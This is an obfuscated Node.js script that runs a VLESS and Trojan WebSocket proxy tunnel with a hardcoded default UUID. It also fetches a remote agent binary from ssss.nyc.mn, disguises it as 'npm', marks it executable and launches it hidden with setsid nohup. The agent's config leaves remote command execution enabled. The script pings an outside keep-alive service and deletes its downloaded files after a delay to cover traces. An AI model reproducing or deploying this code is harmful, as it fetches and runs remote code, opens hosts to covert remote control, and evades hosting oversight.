const _0x537ea3=_0x4de9;(function(_0x26c2f9,_0x11c65f){const _0x30ca49=_0x4de9,_0x3fd9c2=_0x26c2f9();while(!![]){try{const _0x36e7df=-parseInt(_0x30ca49(0xe3))/0x1+-parseInt(_0x30ca49(0xd0))/0x2*(parseInt(_0x30ca49(0xfb))/0x3)+parseInt(_0x30ca49(0xe2))/0x4+-parseInt(_0x30ca49(0xf7))/0x5*(-parseInt(_0x30ca49(0xd1))/0x6)+parseInt(_0x30ca49(0xdd))/0x7+-parseInt(_0x30ca49(0xa6))/0x8*(-parseInt(_0x30ca49(0x10f))/0x9)+-parseInt(_0x30ca49(0xc1))/0xa*(-parseInt(_0x30ca49(0xf2))/0xb);if(_0x36e7df===_0x11c65f)break;else _0x3fd9c2['push'](_0x3fd9c2['shift']());}catch(_0xe9d5ff){_0x3fd9c2['push'](_0x3fd9c2['shift']());}}}(_0x1c83,0x9ee8d));const os=require('os'),http=require(_0x537ea3(0xbc)),fs=require('fs'),axios=require(_0x537ea3(0xf9)),net=require('net'),path=require('path'),crypto=require(_0x537ea3(0xa9)),{Buffer}=require(_0x537ea3(0x9d)),{exec,execSync}=require(_0x537ea3(0xf6)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x537ea3(0xf1)][_0x537ea3(0xa1)]||'ad92baec-147c-4f0b-9722-38ca2a0bae5a',NEZHA_SERVER=process['env'][_0x537ea3(0x9a)]||'',NEZHA_PORT=process[_0x537ea3(0xf1)][_0x537ea3(0xb8)]||'',NEZHA_KEY=process[_0x537ea3(0xf1)]['NEZHA_KEY']||'',DOMAIN=process[_0x537ea3(0xf1)][_0x537ea3(0xb0)]||_0x537ea3(0xe4),AUTO_ACCESS=process['env'][_0x537ea3(0xb9)]||!![],WSPATH=process['env'][_0x537ea3(0xa2)]||UUID['slice'](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||_0x537ea3(0xed),NAME=process[_0x537ea3(0xf1)][_0x537ea3(0x110)]||_0x537ea3(0xb5),PORT=process[_0x537ea3(0xf1)][_0x537ea3(0xa7)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x360065=_0x537ea3;try{const _0x2411d2=await axios[_0x360065(0x96)](_0x360065(0xfd)),_0x912ea6=_0x2411d2[_0x360065(0xe8)];ISP=(_0x912ea6[_0x360065(0xf4)]+'-'+_0x912ea6[_0x360065(0xcd)])[_0x360065(0x99)](/ /g,'_');}catch(_0x20e6f2){ISP=_0x360065(0xec);}};GetISP();const httpServer=http[_0x537ea3(0xff)]((_0x577668,_0x33d048)=>{const _0x27145d=_0x537ea3;if(_0x577668[_0x27145d(0x101)]==='/'){const _0x191867=path[_0x27145d(0xef)](__dirname,_0x27145d(0xe6));fs['readFile'](_0x191867,'utf8',(_0x5a0668,_0x8cefef)=>{const _0xeaff82=_0x27145d;if(_0x5a0668){_0x33d048[_0xeaff82(0xbb)](0xc8,{'Content-Type':'text/html'}),_0x33d048[_0xeaff82(0xcf)]('Hello\x20world!');return;}_0x33d048[_0xeaff82(0xbb)](0xc8,{'Content-Type':_0xeaff82(0xc0)}),_0x33d048[_0xeaff82(0xcf)](_0x8cefef);});return;}else{if(_0x577668[_0x27145d(0x101)]==='/'+SUB_PATH){const _0x1d68c4=_0x27145d(0x97)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x27145d(0xd3)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x3c6527=_0x27145d(0x10b)+UUID+'@'+DOMAIN+_0x27145d(0x104)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x27145d(0xf0)+WSPATH+'#'+NAME+'-'+ISP,_0x3770de=_0x1d68c4+'\x0a'+_0x3c6527,_0x548f69=Buffer['from'](_0x3770de)[_0x27145d(0xc4)](_0x27145d(0xad));_0x33d048['writeHead'](0xc8,{'Content-Type':_0x27145d(0xb3)}),_0x33d048['end'](_0x548f69+'\x0a');}else _0x33d048[_0x27145d(0xbb)](0x194,{'Content-Type':_0x27145d(0xb3)}),_0x33d048[_0x27145d(0xcf)](_0x27145d(0xde));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x537ea3(0x99)](/-/g,''),DNS_SERVERS=[_0x537ea3(0xb1),_0x537ea3(0x10c)];function resolveHost(_0x2d5725){return new Promise((_0x50a65e,_0x39775a)=>{const _0x5a16be=_0x4de9;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5a16be(0x9f)](_0x2d5725)){_0x50a65e(_0x2d5725);return;}let _0x1da9ba=0x0;function _0x5627cc(){const _0x1e1f72=_0x5a16be;if(_0x1da9ba>=DNS_SERVERS[_0x1e1f72(0x109)]){_0x39775a(new Error(_0x1e1f72(0xa4)+_0x2d5725+'\x20with\x20all\x20DNS\x20servers'));return;}const _0xd195a3=DNS_SERVERS[_0x1da9ba];_0x1da9ba++;const _0x14b801='https://dns.google/resolve?name='+encodeURIComponent(_0x2d5725)+_0x1e1f72(0xea);axios[_0x1e1f72(0x96)](_0x14b801,{'timeout':0x1388,'headers':{'Accept':_0x1e1f72(0xe9)}})[_0x1e1f72(0xd5)](_0x1166aa=>{const _0x3fc65f=_0x1e1f72,_0x16d9a1=_0x1166aa[_0x3fc65f(0xe8)];if(_0x16d9a1[_0x3fc65f(0x103)]===0x0&&_0x16d9a1[_0x3fc65f(0x9b)]&&_0x16d9a1[_0x3fc65f(0x9b)][_0x3fc65f(0x109)]>0x0){const _0x4e8e34=_0x16d9a1[_0x3fc65f(0x9b)][_0x3fc65f(0xcb)](_0x464e6a=>_0x464e6a[_0x3fc65f(0xce)]===0x1);if(_0x4e8e34){_0x50a65e(_0x4e8e34[_0x3fc65f(0xe8)]);return;}}_0x5627cc();})[_0x1e1f72(0xe7)](_0x24c62f=>{_0x5627cc();});}_0x5627cc();});}function handleVlessConnection(_0x54f608,_0x36fcca){const _0x2cd92b=_0x537ea3,[_0x1739fb]=_0x36fcca,_0x65673d=_0x36fcca[_0x2cd92b(0xc5)](0x1,0x11);if(!_0x65673d[_0x2cd92b(0x10a)]((_0x10e8c5,_0x41b9fe)=>_0x10e8c5==parseInt(uuid[_0x2cd92b(0xd2)](_0x41b9fe*0x2,0x2),0x10)))return![];let _0x586374=_0x36fcca[_0x2cd92b(0xc5)](0x11,0x12)['readUInt8']()+0x13;const _0x8680ee=_0x36fcca[_0x2cd92b(0xc5)](_0x586374,_0x586374+=0x2)[_0x2cd92b(0x95)](0x0),_0x5ee5a0=_0x36fcca['slice'](_0x586374,_0x586374+=0x1)['readUInt8'](),_0x2e1e10=_0x5ee5a0==0x1?_0x36fcca[_0x2cd92b(0xc5)](_0x586374,_0x586374+=0x4)[_0x2cd92b(0xef)]('.'):_0x5ee5a0==0x2?new TextDecoder()[_0x2cd92b(0x10e)](_0x36fcca['slice'](_0x586374+0x1,_0x586374+=0x1+_0x36fcca['slice'](_0x586374,_0x586374+0x1)[_0x2cd92b(0xba)]())):_0x5ee5a0==0x3?_0x36fcca[_0x2cd92b(0xc5)](_0x586374,_0x586374+=0x10)[_0x2cd92b(0xb4)]((_0x1a63a7,_0x5a922e,_0x218095,_0x546cd9)=>_0x218095%0x2?_0x1a63a7['concat'](_0x546cd9[_0x2cd92b(0xc5)](_0x218095-0x1,_0x218095+0x1)):_0x1a63a7,[])[_0x2cd92b(0x9c)](_0x353bab=>_0x353bab[_0x2cd92b(0x95)](0x0)[_0x2cd92b(0xc4)](0x10))[_0x2cd92b(0xef)](':'):'';_0x54f608[_0x2cd92b(0xf3)](new Uint8Array([_0x1739fb,0x0]));const _0x2084f1=createWebSocketStream(_0x54f608);return resolveHost(_0x2e1e10)[_0x2cd92b(0xd5)](_0x47d094=>{const _0x5d9bac=_0x2cd92b;net['connect']({'host':_0x47d094,'port':_0x8680ee},function(){const _0x32110d=_0x4de9;this[_0x32110d(0xbf)](_0x36fcca[_0x32110d(0xc5)](_0x586374)),_0x2084f1['on']('error',()=>{})[_0x32110d(0xc6)](this)['on']('error',()=>{})[_0x32110d(0xc6)](_0x2084f1);})['on'](_0x5d9bac(0xa0),()=>{});})[_0x2cd92b(0xe7)](_0x52df1e=>{const _0x474d18=_0x2cd92b;net['connect']({'host':_0x2e1e10,'port':_0x8680ee},function(){const _0x802a56=_0x4de9;this['write'](_0x36fcca[_0x802a56(0xc5)](_0x586374)),_0x2084f1['on'](_0x802a56(0xa0),()=>{})[_0x802a56(0xc6)](this)['on'](_0x802a56(0xa0),()=>{})[_0x802a56(0xc6)](_0x2084f1);})['on'](_0x474d18(0xa0),()=>{});}),!![];}function handleTrojanConnection(_0x12496f,_0x502a27){const _0x553f61=_0x537ea3;try{if(_0x502a27[_0x553f61(0x109)]<0x3a)return![];const _0x44f688=_0x502a27[_0x553f61(0xc5)](0x0,0x38)[_0x553f61(0xc4)](),_0x4008d7=[UUID];let _0x2ad926=null;for(const _0x4da31a of _0x4008d7){const _0xe51ec8=crypto['createHash']('sha224')[_0x553f61(0x102)](_0x4da31a)['digest'](_0x553f61(0xe0));if(_0xe51ec8===_0x44f688){_0x2ad926=_0x4da31a;break;}}if(!_0x2ad926)return![];let _0x232fae=0x38;_0x502a27[_0x232fae]===0xd&&_0x502a27[_0x232fae+0x1]===0xa&&(_0x232fae+=0x2);const _0x1e65f4=_0x502a27[_0x232fae];if(_0x1e65f4!==0x1)return![];_0x232fae+=0x1;const _0x5f2367=_0x502a27[_0x232fae];_0x232fae+=0x1;let _0x39b552,_0x4e589f;if(_0x5f2367===0x1)_0x39b552=_0x502a27[_0x553f61(0xc5)](_0x232fae,_0x232fae+0x4)[_0x553f61(0xef)]('.'),_0x232fae+=0x4;else{if(_0x5f2367===0x3){const _0x5a24e2=_0x502a27[_0x232fae];_0x232fae+=0x1,_0x39b552=_0x502a27[_0x553f61(0xc5)](_0x232fae,_0x232fae+_0x5a24e2)['toString'](),_0x232fae+=_0x5a24e2;}else{if(_0x5f2367===0x4)_0x39b552=_0x502a27[_0x553f61(0xc5)](_0x232fae,_0x232fae+0x10)[_0x553f61(0xb4)]((_0x398beb,_0x3b3c81,_0x2fafd1,_0x3c4c9b)=>_0x2fafd1%0x2?_0x398beb[_0x553f61(0xf5)](_0x3c4c9b[_0x553f61(0xc5)](_0x2fafd1-0x1,_0x2fafd1+0x1)):_0x398beb,[])[_0x553f61(0x9c)](_0x6e2cb8=>_0x6e2cb8[_0x553f61(0x95)](0x0)['toString'](0x10))[_0x553f61(0xef)](':'),_0x232fae+=0x10;else return![];}}_0x4e589f=_0x502a27[_0x553f61(0x95)](_0x232fae),_0x232fae+=0x2;_0x232fae<_0x502a27[_0x553f61(0x109)]&&_0x502a27[_0x232fae]===0xd&&_0x502a27[_0x232fae+0x1]===0xa&&(_0x232fae+=0x2);const _0x50f6f7=createWebSocketStream(_0x12496f);return resolveHost(_0x39b552)[_0x553f61(0xd5)](_0x268bdb=>{const _0x4dd263=_0x553f61;net['connect']({'host':_0x268bdb,'port':_0x4e589f},function(){const _0x17d133=_0x4de9;_0x232fae<_0x502a27[_0x17d133(0x109)]&&this[_0x17d133(0xbf)](_0x502a27[_0x17d133(0xc5)](_0x232fae)),_0x50f6f7['on'](_0x17d133(0xa0),()=>{})[_0x17d133(0xc6)](this)['on']('error',()=>{})[_0x17d133(0xc6)](_0x50f6f7);})['on'](_0x4dd263(0xa0),()=>{});})[_0x553f61(0xe7)](_0x226c9a=>{const _0x3c7602=_0x553f61;net[_0x3c7602(0x107)]({'host':_0x39b552,'port':_0x4e589f},function(){const _0x4ce7a7=_0x3c7602;_0x232fae<_0x502a27[_0x4ce7a7(0x109)]&&this[_0x4ce7a7(0xbf)](_0x502a27['slice'](_0x232fae)),_0x50f6f7['on'](_0x4ce7a7(0xa0),()=>{})['pipe'](this)['on'](_0x4ce7a7(0xa0),()=>{})['pipe'](_0x50f6f7);})['on'](_0x3c7602(0xa0),()=>{});}),!![];}catch(_0x459193){return![];}}wss['on'](_0x537ea3(0xd6),(_0x47d0ea,_0x24d141)=>{const _0x2576a3=_0x537ea3,_0x13c0e8=_0x24d141[_0x2576a3(0x101)]||'';_0x47d0ea['once'](_0x2576a3(0xfa),_0x501387=>{const _0xf3e06b=_0x2576a3;if(_0x501387[_0xf3e06b(0x109)]>0x11&&_0x501387[0x0]===0x0){const _0x2a228f=_0x501387['slice'](0x1,0x11),_0x5432f4=_0x2a228f[_0xf3e06b(0x10a)]((_0x4fdb7e,_0x2fb652)=>_0x4fdb7e==parseInt(uuid['substr'](_0x2fb652*0x2,0x2),0x10));if(_0x5432f4){!handleVlessConnection(_0x47d0ea,_0x501387)&&_0x47d0ea[_0xf3e06b(0x9e)]();return;}}!handleTrojanConnection(_0x47d0ea,_0x501387)&&_0x47d0ea[_0xf3e06b(0x9e)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x14e37a=_0x537ea3,_0x2ca3b1=os[_0x14e37a(0xd8)]();return _0x2ca3b1===_0x14e37a(0xdc)||_0x2ca3b1===_0x14e37a(0x105)||_0x2ca3b1===_0x14e37a(0xc9)?!NEZHA_PORT?_0x14e37a(0xee):_0x14e37a(0xc2):!NEZHA_PORT?_0x14e37a(0xc8):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x22e315=_0x537ea3;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5ec362=getDownloadUrl(),_0x14ba91=await axios({'method':_0x22e315(0x96),'url':_0x5ec362,'responseType':_0x22e315(0xae)}),_0x3ac205=fs['createWriteStream'](_0x22e315(0xfe));return _0x14ba91[_0x22e315(0xe8)]['pipe'](_0x3ac205),new Promise((_0x1b8414,_0x10c568)=>{const _0x4e263a=_0x22e315;_0x3ac205['on']('finish',()=>{const _0x535d57=_0x4de9;console['log'](_0x535d57(0xca)),exec(_0x535d57(0x10d),_0x4e942f=>{if(_0x4e942f)_0x10c568(_0x4e942f);_0x1b8414();});}),_0x3ac205['on'](_0x4e263a(0xa0),_0x10c568);});}catch(_0x59c635){throw _0x59c635;}},runnz=async()=>{const _0x2c9d28=_0x537ea3;try{const _0x183a9b=execSync(_0x2c9d28(0xb6),{'encoding':_0x2c9d28(0x108)});if(_0x183a9b[_0x2c9d28(0xcc)]()!==''){console[_0x2c9d28(0xda)](_0x2c9d28(0xf8));return;}}catch(_0x34e454){}await downloadFile();let _0x5da61e='',_0x2fdb17=[_0x2c9d28(0xa8),_0x2c9d28(0xaa),_0x2c9d28(0xc3),_0x2c9d28(0xeb),_0x2c9d28(0xdb),_0x2c9d28(0xa5)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x30b5ef=_0x2fdb17[_0x2c9d28(0x98)](NEZHA_PORT)?'--tls':'';_0x5da61e=_0x2c9d28(0x100)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x30b5ef+_0x2c9d28(0xe5);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xca002e=NEZHA_SERVER[_0x2c9d28(0x98)](':')?NEZHA_SERVER[_0x2c9d28(0xbd)](':')[_0x2c9d28(0xfc)]():'',_0x48b97a=_0x2fdb17[_0x2c9d28(0x98)](_0xca002e)?_0x2c9d28(0xd9):_0x2c9d28(0xc7),_0x5d2755='client_secret:\x20'+NEZHA_KEY+_0x2c9d28(0xab)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x48b97a+_0x2c9d28(0xd7)+UUID;fs[_0x2c9d28(0xac)](_0x2c9d28(0xa3),_0x5d2755);}_0x5da61e=_0x2c9d28(0xaf);}else{console['log'](_0x2c9d28(0xe1));return;}}try{exec(_0x5da61e,{'shell':_0x2c9d28(0xbe)},_0x3cb10e=>{const _0x2fe1da=_0x2c9d28;if(_0x3cb10e)console[_0x2fe1da(0xa0)]('npm\x20running\x20error:',_0x3cb10e);else console[_0x2fe1da(0xda)](_0x2fe1da(0xdf));});}catch(_0x558348){console['error']('error:\x20'+_0x558348);}};function _0x4de9(_0x41ebbd,_0x1c2432){const _0x1c836e=_0x1c83();return _0x4de9=function(_0x4de9eb,_0x5290e7){_0x4de9eb=_0x4de9eb-0x95;let _0x53661f=_0x1c836e[_0x4de9eb];return _0x53661f;},_0x4de9(_0x41ebbd,_0x1c2432);}async function addAccessTask(){const _0x1c9cb5=_0x537ea3;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2557c7='https://'+DOMAIN;try{const _0x1456d5=await axios[_0x1c9cb5(0xb2)](_0x1c9cb5(0xd4),{'url':_0x2557c7},{'headers':{'Content-Type':'application/json'}});console[_0x1c9cb5(0xda)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x3150c6){}}function _0x1c83(){const _0x147978=['114272hESOqI','PORT','443','crypto','8443','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','writeFileSync','base64','stream','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','DOMAIN','8.8.4.4','post','text/plain','reduce','Hug','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','listen','NEZHA_PORT','AUTO_ACCESS','readUInt8','writeHead','http','split','/bin/bash','write','text/html','17530iidcwK','https://arm64.ssss.nyc.mn/agent','2096','toString','slice','pipe','false','https://amd64.ssss.nyc.mn/v1','aarch64','npm\x20download\x20successfully','find','trim','asOrganization','type','end','16794Ebxuce','18ODoJpk','substr','&fp=chrome&type=ws&host=','https://oooo.serv00.net/add-url','then','connection','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','arch','true','log','2083','arm','4922666qrlRXF','Not\x20Found\x0a','npm\x20is\x20running','hex','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','3104920aFwUXN','1154370KRKFzB','1234.abc.com','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','index.html','catch','data','application/dns-json','&type=A','2087','Unknown','sub','https://arm64.ssss.nyc.mn/v1','join','&path=%2F','env','1023vWQYvn','send','country','concat','child_process','716075dbtFgm','npm\x20is\x20already\x20running,\x20skip\x20running...','axios','message','177DsdWmT','pop','https://speed.cloudflare.com/meta','npm','createServer','setsid\x20nohup\x20./npm\x20-s\x20','url','update','Status',':443?security=tls&sni=','arm64','unlink','connect','utf-8','length','every','trojan://','1.1.1.1','chmod\x20+x\x20npm','decode','144dVvxgV','NAME','readUInt16BE','get','vless://','includes','replace','NEZHA_SERVER','Answer','map','buffer','close','test','error','UUID','WSPATH','config.yaml','Failed\x20to\x20resolve\x20','2053'];_0x1c83=function(){return _0x147978;};return _0x1c83();}const delFiles=()=>{const _0x891133=_0x537ea3;fs[_0x891133(0x106)](_0x891133(0xfe),()=>{}),fs[_0x891133(0x106)](_0x891133(0xa3),()=>{});};httpServer[_0x537ea3(0xb7)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
